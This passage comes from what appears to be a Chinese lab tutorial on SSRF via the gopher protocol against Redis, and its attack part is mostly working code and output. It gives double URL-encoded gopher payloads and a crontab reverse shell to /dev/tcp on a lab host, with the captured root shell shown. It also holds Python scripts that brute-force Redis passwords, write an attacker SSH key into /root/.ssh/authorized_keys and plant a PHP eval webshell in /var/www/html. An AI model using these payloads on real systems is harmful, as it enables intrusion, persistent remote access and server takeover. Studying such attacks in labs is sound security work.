+</span></code></pre>
+<p>执行结果如下</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">margine:~</span><span> margin$ curl gopher://192.168.0.119:6379/_%</span><span style="color:#d08770;">2</span><span>a%</span><span style="color:#d08770;">32</span><span>%</span><span style="color:#d08770;">0</span><span>d%</span><span style="color:#d08770;">0</span><span>a%</span><span style="color:#d08770;">24</span><span>%</span><span style="color:#d08770;">33</span><span>%</span><span style="color:#d08770;">0</span><span>d%</span><span style="color:#d08770;">0</span><span>a%</span><span style="color:#d08770;">67</span><span>%</span><span style="color:#d08770;">65</span><span>%</span><span style="color:#d08770;">74</span><span>%</span><span style="color:#d08770;">0</span><span>d%</span><span style="color:#d08770;">0</span><span>a%</span><span style="color:#d08770;">24</span><span>%</span><span style="color:#d08770;">34</span><span>%</span><span style="color:#d08770;">0</span><span>d%</span><span style="color:#d08770;">0</span><span>a%</span><span style="color:#d08770;">6</span><span>e%</span><span style="color:#d08770;">61</span><span>%</span><span style="color:#d08770;">6</span><span>d%</span><span style="color:#d08770;">65</span><span>%</span><span style="color:#d08770;">0</span><span>d%</span><span style="color:#d08770;">0</span><span>a
+</span><span>$</span><span style="color:#bf616a;">6
+</span><span style="color:#bf616a;">Margin
+</span></code></pre>
+<p>那如果是在web漏洞中呢？如何利用？经过 <strong>Gopher协议在SSRF漏洞中的深入研究</strong> 的内容可以很容易的联想到使用方法：</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>1、构造利用代码
+</span><span>2、url转码
+</span><span>3、再次url转码
+</span></code></pre>
+<p>web环境我们还是使用上一节课的代码（curl_exec.php），代码如下：</p>
+<pre data-lang="php" style="background-color:#2b303b;color:#c0c5ce;" class="language-php "><code class="language-php" data-lang="php"><span style="color:#ab7967;">&lt;?php
+</span><span>$</span><span style="color:#bf616a;">url </span><span>= $</span><span style="color:#bf616a;">_GET</span><span>[&#39;</span><span style="color:#a3be8c;">url</span><span>&#39;];
+</span><span style="color:#96b5b4;">echo </span><span>$</span><span style="color:#bf616a;">url</span><span>;
+</span><span style="color:#65737e;">#var_dump(curl_version());
+</span><span>$</span><span style="color:#bf616a;">curlobj </span><span>= </span><span style="color:#96b5b4;">curl_init</span><span>($</span><span style="color:#bf616a;">url</span><span>);
+</span><span style="color:#96b5b4;">echo curl_exec</span><span>($</span><span style="color:#bf616a;">curlobj</span><span>);
+</span><span style="color:#ab7967;">?&gt;
+</span></code></pre>
+<p>最终构造利用代码为：</p>
+<pre data-lang="http" style="background-color:#2b303b;color:#c0c5ce;" class="language-http "><code class="language-http" data-lang="http"><span>http://192.168.0.109/ssrf/base/curl_exec.php?url=gopher%3a%2f%2f192.168.0.119%3a6379%2f_%25%32%61%25%33%32%25%30%64%25%30%61%25%32%34%25%33%33%25%30%64%25%30%61%25%36%37%25%36%35%25%37%34%25%30%64%25%30%61%25%32%34%25%33%34%25%30%64%25%30%61%25%36%65%25%36%31%25%36%64%25%36%35%25%30%64%25%30%61
+</span></code></pre>
+<p>但使用curl请求后一直卡顿，没有任何回显，无比绝望，我的排查思路为下：</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>1、查看web日志，是否有错误日志（发现并没有）
+</span><span>2、在执行curl_exe函数前，加上exit()函数，这样我便能判断http请求是否到后台代码了（结果可以）
+</span><span>3、查看redis的命令执行记录（接下来讲这个）
+</span></code></pre>
+<p>在Linux命令行中执行以下命令来查看Redis命令执行记录：</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">redis-cli -h</span><span> 127.0.0.1  monitor
+</span></code></pre>
+<p>执行结果为下图，说明redis接收到了来自gopher的请求，但没有命令回显，为什么？（需要在命令后面加QUIT，后面会用到）<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624806164809-e5e3edbd-af7d-4928-8738-e54027fc5320.png#align=left&amp;display=inline&amp;height=174&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=174&amp;originWidth=2446&amp;size=483602&amp;status=done&amp;style=none&amp;width=2446" alt="image.png" /><br />虽然无法回显命令执行的结果，但是命令确实是执行了，接下来测试下反弹shell（没有用上面讲的redis的数据包格式，下面的格式也可以），命令如下：</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>set mars &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.119/9999 0&gt;&amp;1\n\n\n\n&quot;
+</span><span>config set dir /etc/
+</span><span>config set dbfilename crontab
+</span><span>save
+</span></code></pre>
+<p>上述命令的含义总结为，利用Redis的备份功能，将crontab的定时任务备份到/etc/crontab中，起到执行命令的效果，因为Linux会监测/etc/crontab的内容，当我们将反弹shell的命令加入进去后，便会被执行，具体解释如下：</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span># 添加名为mars的key，值为后面反弹shell的语句,5个星号代表每分钟执行一次，开始和技术的\n必须要有一个，也就是前后各有一个，当然，多个可以，主要是为了避免crontab的语法错误。crontab知识可以参考：【https://www.runoob.com/w3cnote/linux-crontab-tasks.html】
+</span><span>set mars &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.119/9999 0&gt;&amp;1\n\n\n\n&quot;
+</span><span># 设置备份的路径为/etc
+</span><span>config set dir /etc/
+</span><span># 设置备份文件名为crontab
+</span><span>config set dbfilename crontab
+</span><span># 开始备份
+</span><span>save
+</span></code></pre>
+<p>进行二次URL编码，结果如下：</p>
+<pre data-lang="http" style="background-color:#2b303b;color:#c0c5ce;" class="language-http "><code class="language-http" data-lang="http"><span>http://192.168.0.109/ssrf/base/curl_exec.php?url=gopher%3a%2f%2f192.168.0.119%3a6379%2f_%25%30%64%25%30%61%25%30%64%25%30%61%25%37%33%25%36%35%25%37%34%25%32%30%25%36%64%25%36%31%25%37%32%25%37%33%25%32%30%25%32%32%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%32%61%25%32%30%25%32%61%25%32%30%25%32%61%25%32%30%25%32%61%25%32%30%25%32%61%25%32%30%25%37%32%25%36%66%25%36%66%25%37%34%25%32%30%25%36%32%25%36%31%25%37%33%25%36%38%25%32%30%25%32%64%25%36%39%25%32%30%25%33%65%25%32%36%25%32%30%25%32%66%25%36%34%25%36%35%25%37%36%25%32%66%25%37%34%25%36%33%25%37%30%25%32%66%25%33%31%25%33%39%25%33%32%25%32%65%25%33%31%25%33%36%25%33%38%25%32%65%25%33%30%25%32%65%25%33%31%25%33%31%25%33%39%25%32%66%25%33%39%25%33%39%25%33%39%25%33%39%25%32%30%25%33%30%25%33%65%25%32%36%25%33%31%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%32%32%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%39%25%37%32%25%32%30%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%32%25%36%36%25%36%39%25%36%63%25%36%35%25%36%65%25%36%31%25%36%64%25%36%35%25%32%30%25%36%33%25%37%32%25%36%66%25%36%65%25%37%34%25%36%31%25%36%32%25%30%64%25%30%61%25%37%33%25%36%31%25%37%36%25%36%35%25%30%64%25%30%61
+</span></code></pre>
+<p>执行结果如下，1分钟后发现成功反弹shell。</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">margine:~</span><span> margin$ nc</span><span style="color:#bf616a;"> -l</span><span> 9999
+</span><span style="color:#bf616a;">ls
+</span><span style="color:#bf616a;">bash:</span><span> no job control in this shell
+</span><span style="color:#bf616a;">[root@7471cd804b12 ~</span><span>]# ls
+</span><span style="color:#bf616a;">anaconda-ks.cfg
+</span><span style="color:#bf616a;">install.log
+</span><span style="color:#bf616a;">install.log.syslog
+</span></code></pre>
+<p>简易脚本如下：</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#65737e;">#!/usr/bin/python
+</span><span style="color:#65737e;"># -*- coding: UTF-8 -*-
+</span><span style="color:#b48ead;">import </span><span>urllib2,urllib
+</span><span>
+</span><span>url = &quot;</span><span style="color:#a3be8c;">http://192.168.0.109/ssrf/base/curl_exec.php?url=</span><span>&quot;
+</span><span>gopher = &quot;</span><span style="color:#a3be8c;">gopher://192.168.0.119:6379/_</span><span>&quot;
+</span><span style="color:#65737e;"># 攻击脚本，\n的\一定要转义
+</span><span>&quot;</span><span style="color:#a3be8c;">set mars </span><span>&quot;\</span><span style="background-color:#bf616a;color:#2b303b;">\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.119/6670  0&gt;&amp;1\\n&quot;</span><span>
+</span><span>config set </span><span style="color:#96b5b4;">dir </span><span>/etc/
+</span><span>config set dbfilename crontab
+</span><span>save
+</span><span style="color:#65737e;">&quot;&quot;&quot;
+</span><span style="color:#65737e;">
+</span><span style="color:#65737e;">def encoder_url(data):
+</span><span style="color:#65737e;">    encoder = &quot;&quot;
+</span><span style="color:#65737e;">    for single_char in data:
+</span><span style="color:#65737e;">        # 先转为ASCII
+</span><span style="color:#65737e;">        encoder += str(hex(ord(single_char)))
+</span><span style="color:#65737e;">    encoder = encoder.replace(&quot;0x&quot;,&quot;%&quot;).replace(&quot;%a&quot;,&quot;%0d%0a&quot;)
+</span><span style="color:#65737e;">    return encoder
+</span><span style="color:#65737e;">
+</span><span style="color:#65737e;"># 二次编码
+</span><span style="color:#65737e;">encoder = encoder_url(encoder_url(data))
+</span><span style="color:#65737e;">
+</span><span style="color:#65737e;"># 生存payload
+</span><span style="color:#65737e;">payload = url + urllib.quote(gopher,&#39;utf-8&#39;) + encoder
+</span><span style="color:#65737e;">
+</span><span style="color:#65737e;"># 发起请求
+</span><span style="color:#65737e;">request = urllib2.Request(payload)
+</span><span style="color:#65737e;">response = urllib2.urlopen(request).read()
+</span></code></pre>
+<h3 id="0x02-redisren-zheng-gong-ji">0x02 Redis认证攻击</h3>
+<p>以上为Redis未授权访问攻击，但如果Redis设置了密码呢？<br />如果要执行命令的话，必须要有密码才可以，所以接下来的问题便是如何破解Redis的密码，首先想到的暴力破解。此时要研究下Redis如何验证身份信息。方法还是抓包，抓到认证的流量，重放即可。抓包发现：</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>*2
+</span><span>$4
+</span><span>auth
+</span><span>$6
+</span><span>Margin
+</span></code></pre>
+<p>可以翻译为认证命令为auth xxxx<br />那么我们将redis的密码改为任意密码，我设置为Margin</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>config set requirepass Margin
+</span></code></pre>
+<p>将请求包改为</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>auth Margin
+</span><span>quit
+</span></code></pre>
+<p>python代码变为</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#65737e;">#!/usr/bin/python
+</span><span style="color:#65737e;"># -*- coding: UTF-8 -*-
+</span><span style="color:#b48ead;">import </span><span>urllib2,urllib
+</span><span>
+</span><span>url = &quot;</span><span style="color:#a3be8c;">http://192.168.0.109/ssrf/base/curl_exec.php?url=</span><span>&quot;
+</span><span>gopher = &quot;</span><span style="color:#a3be8c;">gopher://192.168.0.119:6379/_</span><span>&quot;
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">get_password</span><span>():
+</span><span>    f = </span><span style="color:#96b5b4;">open</span><span>(&quot;</span><span style="color:#a3be8c;">password.txt</span><span>&quot;,&quot;</span><span style="color:#a3be8c;">r</span><span>&quot;)
+</span><span>    </span><span style="color:#b48ead;">return </span><span>f.</span><span style="color:#bf616a;">readlines</span><span>()
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">encoder_url</span><span>(</span><span style="color:#bf616a;">data</span><span>):
+</span><span>    encoder = &quot;&quot;
+</span><span>    </span><span style="color:#b48ead;">for </span><span>single_char </span><span style="color:#b48ead;">in </span><span>data:
+</span><span>        </span><span style="color:#65737e;"># 先转为ASCII
+</span><span>        encoder += </span><span style="color:#bf616a;">str</span><span>(</span><span style="color:#96b5b4;">hex</span><span>(</span><span style="color:#96b5b4;">ord</span><span>(single_char)))
+</span><span>    encoder = encoder.</span><span style="color:#bf616a;">replace</span><span>(&quot;</span><span style="color:#a3be8c;">0x</span><span>&quot;,&quot;</span><span style="color:#a3be8c;">%</span><span>&quot;).</span><span style="color:#bf616a;">replace</span><span>(&quot;</span><span style="color:#d08770;">%a</span><span>&quot;,&quot;</span><span style="color:#d08770;">%0d%0a</span><span>&quot;)
+</span><span>    </span><span style="color:#b48ead;">return </span><span>encoder
+</span><span>
+</span><span>mark = </span><span style="color:#d08770;">0
+</span><span style="color:#b48ead;">for </span><span>password </span><span style="color:#b48ead;">in </span><span style="color:#bf616a;">get_password</span><span>():
+</span><span>    </span><span style="color:#65737e;"># 攻击脚本
+</span><span>    data = &quot;&quot;&quot;</span><span style="color:#a3be8c;">auth </span><span style="color:#d08770;">%s
+</span><span style="color:#a3be8c;">    quit
+</span><span style="color:#a3be8c;">    </span><span>&quot;&quot;&quot; % password
+</span><span>    </span><span style="color:#65737e;"># 二次编码
+</span><span>    encoder = </span><span style="color:#bf616a;">encoder_url</span><span>(</span><span style="color:#bf616a;">encoder_url</span><span>(data))
+</span><span>    </span><span style="color:#65737e;"># 生存payload
+</span><span>    payload = url + urllib.</span><span style="color:#bf616a;">quote</span><span>(gopher,&#39;</span><span style="color:#a3be8c;">utf-8</span><span>&#39;) + encoder
+</span><span>
+</span><span>    </span><span style="color:#65737e;"># 发起请求
+</span><span>    request = urllib2.</span><span style="color:#bf616a;">Request</span><span>(payload)
+</span><span>    response = urllib2.</span><span style="color:#bf616a;">urlopen</span><span>(request).</span><span style="color:#bf616a;">read</span><span>()
+</span><span>    </span><span style="color:#b48ead;">if </span><span>response.</span><span style="color:#bf616a;">count</span><span>(&quot;</span><span style="color:#a3be8c;">+OK</span><span>&quot;) &gt; </span><span style="color:#d08770;">1</span><span>:
+</span><span>        </span><span style="color:#b48ead;">print </span><span>&quot;</span><span style="color:#a3be8c;">find password : </span><span>&quot; + password
+</span><span>        mark = </span><span style="color:#d08770;">1
+</span><span>
+</span><span style="color:#b48ead;">if </span><span>mark == </span><span style="color:#d08770;">0 </span><span>:</span><span style="color:#b48ead;">print </span><span>&quot;</span><span style="color:#a3be8c;">not found</span><span>&quot;
+</span></code></pre>
+<p>所以，在已知密码的情况下可以将攻击的python代码中加入认证的语句，如下：</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>auth Margin
+</span><span>set mars &quot;\\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.119/6671  0&gt;&amp;1\\n&quot;
+</span><span>config set dir /etc/
+</span><span>config set dbfilename crontab
+</span><span>save
+</span></code></pre>
+<p>python代码如下</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#65737e;">#!/usr/bin/python
+</span><span style="color:#65737e;"># -*- coding: UTF-8 -*-
+</span><span style="color:#b48ead;">import </span><span>urllib2,urllib
+</span><span>
+</span><span>url = &quot;</span><span style="color:#a3be8c;">http://192.168.0.109/ssrf/base/curl_exec.php?url=</span><span>&quot;
+</span><span>gopher = &quot;</span><span style="color:#a3be8c;">gopher://192.168.0.119:6379/_</span><span>&quot;
+</span><span>
+</span><span style="color:#65737e;"># 攻击脚本
+</span><span>data = &quot;&quot;&quot;</span><span style="color:#a3be8c;">auth Margin
+</span><span style="color:#a3be8c;">set mars &quot;</span><span style="color:#96b5b4;">\\</span><span style="color:#a3be8c;">n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.119/6671  0&gt;&amp;1</span><span style="color:#96b5b4;">\\</span><span style="color:#a3be8c;">n&quot;
+</span><span style="color:#a3be8c;">config set dir /etc/
+</span><span style="color:#a3be8c;">config set dbfilename crontab
+</span><span style="color:#a3be8c;">save
+</span><span>&quot;&quot;&quot;
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">encoder_url</span><span>(</span><span style="color:#bf616a;">data</span><span>):
+</span><span>    encoder = &quot;&quot;
+</span><span>    </span><span style="color:#b48ead;">for </span><span>single_char </span><span style="color:#b48ead;">in </span><span>data:
+</span><span>        </span><span style="color:#65737e;"># 先转为ASCII
+</span><span>        encoder += </span><span style="color:#bf616a;">str</span><span>(</span><span style="color:#96b5b4;">hex</span><span>(</span><span style="color:#96b5b4;">ord</span><span>(single_char)))
+</span><span>    encoder = encoder.</span><span style="color:#bf616a;">replace</span><span>(&quot;</span><span style="color:#a3be8c;">0x</span><span>&quot;,&quot;</span><span style="color:#a3be8c;">%</span><span>&quot;).</span><span style="color:#bf616a;">replace</span><span>(&quot;</span><span style="color:#d08770;">%a</span><span>&quot;,&quot;</span><span style="color:#d08770;">%0d%0a</span><span>&quot;)
+</span><span>    </span><span style="color:#b48ead;">return </span><span>encoder
+</span><span>
+</span><span style="color:#65737e;"># 二次编码
+</span><span>encoder = </span><span style="color:#bf616a;">encoder_url</span><span>(</span><span style="color:#bf616a;">encoder_url</span><span>(data))
+</span><span>
+</span><span style="color:#65737e;"># 生存payload
+</span><span>payload = url + urllib.</span><span style="color:#bf616a;">quote</span><span>(gopher,&#39;</span><span style="color:#a3be8c;">utf-8</span><span>&#39;) + encoder
+</span><span>
+</span><span style="color:#65737e;"># 发起请求
+</span><span>request = urllib2.</span><span style="color:#bf616a;">Request</span><span>(payload)
+</span><span>response = urllib2.</span><span style="color:#bf616a;">urlopen</span><span>(request).</span><span style="color:#bf616a;">read</span><span>()
+</span></code></pre>
+<p>再次运行python脚本，便可成功反弹shell。</p>
+<h3 id="0x03-xie-ssh-keygengong-yao-shi-yong-si-yao-deng-lu">0x03 写ssh-keygen公钥，使用私钥登陆</h3>
+<p>在上面的内容中描述了如何使用Redis的数据备份执行命令，接下来讲解通过写入ssh-keygen公钥，使用私钥登录。思路还是利用备份，将私钥字符串备份到目标服务器.ssh目录下。<br />要完成此操作，需要两个前提条件</p>
+<ul>
+<li>Redis服务使用ROOT账号启动(可以临时执行sudo -u root /usr/bin/redis-server /etc/redis/redis.conf 来以root权限运行)</li>
+<li>服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</li>
+</ul>
+<p>首先在本地生成一对密钥</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">ssh-keygen -t</span><span> rsa
+</span><span style="color:#bf616a;">margine:.ssh</span><span> margin$ ssh-keygen</span><span style="color:#bf616a;"> -t</span><span> rsa
+</span><span style="color:#bf616a;">Generating</span><span> public/private rsa key pair.
+</span><span style="color:#bf616a;">Enter</span><span> file in which to save the key (/Users/margin/.ssh/id_rsa)</span><span style="color:#96b5b4;">:  
+</span><span style="color:#bf616a;">/Users/margin/.ssh/id_rsa</span><span> already exists.
+</span><span style="color:#bf616a;">Overwrite</span><span> (y/n)</span><span style="color:#bf616a;">?</span><span> y
+</span><span style="color:#bf616a;">Enter</span><span> passphrase (empty for no passphrase)</span><span style="color:#96b5b4;">: 
+</span><span style="color:#bf616a;">Enter</span><span> same passphrase again: 
+</span><span style="color:#bf616a;">Your</span><span> identification has been saved in /Users/margin/.ssh/id_rsa.
+</span><span style="color:#bf616a;">Your</span><span> public key has been saved in /Users/margin/.ssh/id_rsa.pub.
+</span><span style="color:#bf616a;">The</span><span> key fingerprint is:
+</span><span style="color:#bf616a;">SHA256:QKUmi/y9Tu27soIg2+rRrvDO16sQBnrSCzkVx4RcTSw</span><span> margin@margine.local
+</span><span style="color:#bf616a;">The</span><span> key&#39;</span><span style="color:#a3be8c;">s randomart image is:
+</span><span style="color:#a3be8c;">+---[RSA 2048]----+
+</span><span style="color:#a3be8c;">| ..=++o..        |
+</span><span style="color:#a3be8c;">|  ooE.o.         |
+</span><span style="color:#a3be8c;">|. . ..+          |
+</span><span style="color:#a3be8c;">|.* . + .         |
+</span><span style="color:#a3be8c;">|* B .   S        |
+</span><span style="color:#a3be8c;">|o*.+ . .         |
+</span><span style="color:#a3be8c;">|o=oo..o .        |
+</span><span style="color:#a3be8c;">|oo=.o.oo         |
+</span><span style="color:#a3be8c;">|o==o.+=++o       |
+</span><span style="color:#a3be8c;">+----[SHA256]-----+
+</span></code></pre>
+<p>查看密钥的字符串，一会使用Redis的备份功能，将密钥字符串传到目标服务器。</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">margine:.ssh</span><span> margin$ cat id_rsa.pub 
+</span><span style="color:#bf616a;">ssh-rsa</span><span> AAAAB3NzaC1yc2EAAAADAQABAAABAQDgDf+ah2WKGExLdwR/wb8959lZiiV+N0l55PxuwjkclpCAiZSXW8QSMmXPEyRazonnb63cLQHyOnB3u7IPRlqCcKIRnB3qX0GtgjPgDDQlda5pCY99tgtzPQ6qkaiOaxy6k6GQFdSYU5if2m4c/B1DlVSodw7F0sI+v8OG2iGy8UY2n+B049EKpgky45V96xhA9lIFi1tYJiLF7X6tx8l2Jf4OkC8y5am6P1lIG2vg2eraY6iXsCsE8D8Q2nYxdPT5ogKgdyjWULzbRMBjaPgxlgktv12cYjxqbIQhlUKGQxbBxIESf8sY+NMAODAwR4wBDl3thllYsHCzUf5c9yVR margin@margine.local
+</span></code></pre>
+<p>构造payload，如下：</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>config set dir /root/.ssh/
+</span><span>config set dbfilename authorized_keys
+</span><span>set margin &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDgDf+ah2WKGExLdwR/wb8959lZiiV+N0l55PxuwjkclpCAiZSXW8QSMmXPEyRazonnb63cLQHyOnB3u7IPRlqCcKIRnB3qX0GtgjPgDDQlda5pCY99tgtzPQ6qkaiOaxy6k6GQFdSYU5if2m4c/B1DlVSodw7F0sI+v8OG2iGy8UY2n+B049EKpgky45V96xhA9lIFi1tYJiLF7X6tx8l2Jf4OkC8y5am6P1lIG2vg2eraY6iXsCsE8D8Q2nYxdPT5ogKgdyjWULzbRMBjaPgxlgktv12cYjxqbIQhlUKGQxbBxIESf8sY+NMAODAwR4wBDl3thllYsHCzUf5c9yVR margin@margine.local&quot;
+</span><span>save
+</span><span>quit
+</span></code></pre>
+<p>进一步得到python代码为：</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#65737e;">#!/usr/bin/python
+</span><span style="color:#65737e;"># -*- coding: UTF-8 -*-
+</span><span style="color:#b48ead;">import </span><span>urllib2,urllib
+</span><span>
+</span><span>url = &quot;</span><span style="color:#a3be8c;">http://192.168.0.109/ssrf/base/curl_exec.php?url=</span><span>&quot;
+</span><span>gopher = &quot;</span><span style="color:#a3be8c;">gopher://192.168.0.67:6379/_</span><span>&quot;
+</span><span>
+</span><span style="color:#65737e;"># 攻击脚本
+</span><span>data = &quot;&quot;&quot;</span><span style="color:#a3be8c;">config set dir /root/.ssh/
+</span><span style="color:#a3be8c;">config set dbfilename authorized_keys
+</span><span style="color:#a3be8c;">set margin &quot;</span><span style="color:#96b5b4;">\\</span><span style="color:#a3be8c;">n</span><span style="color:#96b5b4;">\\</span><span style="color:#a3be8c;">nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDdIj0d7vofujQU9H2eYIboU16EKy61mAalJXYP66sPINFEToBb7YeaROlpg6/B5u+lgcjOq2X+zxQwid4pSS2xj2kbornpeDXHh9boQqAzDdWgGBuRYi6scfiQ9hY0BN2rQ44gimQkKibM7MJR7XmqnUg/pgIgbepDRlYghj0DUW2iHE9a/z4aZXEZE1SN29OUyQmy/4OOIsCsmmjZBYJ/zmFaWG2aYbGRQDuc6iDITqN1T+CuNQ3PNZUb7GgZQ8FbJHgcFbOjNbfMBcP1SRoKKtA7YIx4eyFw0xUxKPwiAKDIWf3HqlfxTpGeoqMDyPumCioCNeDqeR5Wmy6q9OSn margin@margine.local</span><span style="color:#96b5b4;">\\</span><span style="color:#a3be8c;">n</span><span style="color:#96b5b4;">\\</span><span style="color:#a3be8c;">n&quot;
+</span><span style="color:#a3be8c;">save
+</span><span style="color:#a3be8c;">quit
+</span><span style="color:#a3be8c;">
+</span><span>&quot;&quot;&quot;
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">encoder_url</span><span>(</span><span style="color:#bf616a;">data</span><span>):
+</span><span>    encoder = &quot;&quot;
+</span><span>    </span><span style="color:#b48ead;">for </span><span>single_char </span><span style="color:#b48ead;">in </span><span>data:
+</span><span>        </span><span style="color:#65737e;"># 先转为ASCII
+</span><span>        encoder += </span><span style="color:#bf616a;">str</span><span>(</span><span style="color:#96b5b4;">hex</span><span>(</span><span style="color:#96b5b4;">ord</span><span>(single_char)))
+</span><span>    encoder = encoder.</span><span style="color:#bf616a;">replace</span><span>(&quot;</span><span style="color:#a3be8c;">0x</span><span>&quot;,&quot;</span><span style="color:#a3be8c;">%</span><span>&quot;).</span><span style="color:#bf616a;">replace</span><span>(&quot;</span><span style="color:#d08770;">%a</span><span>&quot;,&quot;</span><span style="color:#d08770;">%0d%0a</span><span>&quot;)
+</span><span>    </span><span style="color:#b48ead;">return </span><span>encoder
+</span><span>
+</span><span style="color:#65737e;"># 二次编码
+</span><span>encoder = </span><span style="color:#bf616a;">encoder_url</span><span>(</span><span style="color:#bf616a;">encoder_url</span><span>(data))
+</span><span>
+</span><span style="color:#b48ead;">print </span><span>encoder
+</span><span style="color:#65737e;"># 生存payload
+</span><span>payload = url + urllib.</span><span style="color:#bf616a;">quote</span><span>(gopher,&#39;</span><span style="color:#a3be8c;">utf-8</span><span>&#39;) + encoder
+</span><span>
+</span><span style="color:#65737e;"># 发起请求
+</span><span>request = urllib2.</span><span style="color:#bf616a;">Request</span><span>(payload)
+</span><span>response = urllib2.</span><span style="color:#bf616a;">urlopen</span><span>(request).</span><span style="color:#bf616a;">read</span><span>()
+</span><span style="color:#b48ead;">print </span><span>response
+</span></code></pre>
+<h3 id="0x04-xie-webshell">0x04 写webshell</h3>
+<p>经过上面文章的学习，对于写webshell来说便变得非常简单，要完成此操作，需要两个前提条件</p>
+<ul>
+<li>当前运行redis的用户在web目录有写权限</li>
+<li>知道web目录的绝对路径</li>
+</ul>
+<p>步骤比较简单，原理还是利用Redis的备份功能，只不过这次是备份成webshell（redis所在的服务器需要phpstudy环境）<br />修改python中的payload，如下：</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>&quot;config set dir /var/www/html/
+</span><span>config set dbfilename margin.php
+</span><span>set margin &quot;\\n&lt;?php eval($_POST[&#39;margin&#39;]);?&gt;\\n&quot;
+</span><span>save
+</span><span>quit
+</span><span>
+</span><span>&quot;&quot;&quot;
+</span></code></pre>
+<p>python代码如下</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#65737e;">#!/usr/bin/python
+</span><span style="color:#65737e;"># -*- coding: UTF-8 -*-
+</span><span style="color:#b48ead;">import </span><span>urllib2,urllib
+</span><span>
+</span><span>url = &quot;</span><span style="color:#a3be8c;">http://192.168.0.109/ssrf/base/curl_exec.php?url=</span><span>&quot;
+</span><span>gopher = &quot;</span><span style="color:#a3be8c;">gopher://192.168.0.67:6379/_</span><span>&quot;
+</span><span>
+</span><span style="color:#65737e;"># 攻击脚本
+</span><span>data = &quot;&quot;&quot;</span><span style="color:#a3be8c;">config set dir /var/www/html/
+</span><span style="color:#a3be8c;">config set dbfilename margin.php
+</span><span style="color:#a3be8c;">set margin &quot;</span><span style="color:#96b5b4;">\\</span><span style="color:#a3be8c;">n&lt;?php eval($_POST[&#39;margin&#39;]);?&gt;</span><span style="color:#96b5b4;">\\</span><span style="color:#a3be8c;">n&quot;
+</span><span style="color:#a3be8c;">save
+</span><span style="color:#a3be8c;">quit
+</span><span style="color:#a3be8c;">
+</span><span>&quot;&quot;&quot;
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">encoder_url</span><span>(</span><span style="color:#bf616a;">data</span><span>):
+</span><span>    encoder = &quot;&quot;
+</span><span>    </span><span style="color:#b48ead;">for </span><span>single_char </span><span style="color:#b48ead;">in </span><span>data:
+</span><span>        </span><span style="color:#65737e;"># 先转为ASCII
+</span><span>        encoder += </span><span style="color:#bf616a;">str</span><span>(</span><span style="color:#96b5b4;">hex</span><span>(</span><span style="color:#96b5b4;">ord</span><span>(single_char)))
+</span><span>    encoder = encoder.</span><span style="color:#bf616a;">replace</span><span>(&quot;</span><span style="color:#a3be8c;">0x</span><span>&quot;,&quot;</span><span style="color:#a3be8c;">%</span><span>&quot;).</span><span style="color:#bf616a;">replace</span><span>(&quot;</span><span style="color:#d08770;">%a</span><span>&quot;,&quot;</span><span style="color:#d08770;">%0d%0a</span><span>&quot;)
+</span><span>    </span><span style="color:#b48ead;">return </span><span>encoder
+</span><span>
+</span><span style="color:#65737e;"># 二次编码
